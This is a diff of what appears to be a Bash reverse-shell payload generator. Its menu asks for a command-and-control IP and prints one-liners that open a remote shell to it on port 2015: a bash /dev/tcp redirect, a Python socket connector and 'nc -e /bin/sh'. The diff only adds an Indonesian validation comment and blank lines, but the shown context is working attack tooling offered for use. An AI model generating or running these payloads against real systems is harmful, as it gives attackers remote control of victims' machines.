@@ -27,7 +27,9 @@ while true; do
         1)
             echo -ne "${Y}Enter C2 IP default: $PUB_IP > ${N}"
             read -r target_ip
+            # Validasi (Kalau kosong pake IP default)
             [ -z "$target_ip" ] && target_ip="$PUB_IP"
+            
             echo -e "${G}[+] Compiling Bash Session Bridge...${N}"
             sleep 1
             echo -e "${W}Vector:${N} bash -i >& /dev/tcp/${target_ip}/2015 0>&1"
@@ -38,6 +40,7 @@ while true; do
             echo -ne "${Y}Enter C2 IP default: $PUB_IP > ${N}"
             read -r target_ip
             [ -z "$target_ip" ] && target_ip="$PUB_IP"
+            
             echo -e "${G}[+] Compiling Python Socket Connector...${N}"
             sleep 1
             echo -e "${W}Vector:${N}"
@@ -49,6 +52,7 @@ while true; do
             echo -ne "${Y}Enter C2 IP default: $PUB_IP > ${N}"
             read -r target_ip
             [ -z "$target_ip" ] && target_ip="$PUB_IP"
+            
             echo -e "${G}[+] Compiling Netcat Payload...${N}"
             sleep 1
             echo -e "${W}Vector:${N} nc -e /bin/sh ${target_ip} 2015"
